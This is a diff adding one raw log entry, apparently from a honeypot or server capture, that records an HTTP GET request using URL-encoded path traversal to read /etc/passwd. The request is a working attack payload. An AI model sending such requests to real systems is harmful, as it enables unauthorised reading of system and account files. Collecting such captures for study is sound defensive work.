@@ -1,0 +1,8 @@
+
+--- 2026-08-19T09:17:23.025512Z peer=183.81.168.186 lang=0000 tag=unk bytes=211 ---
+GET /..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
+Host: 89.22.229.54:4444
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0
+Accept: */*
+Connection: close
+
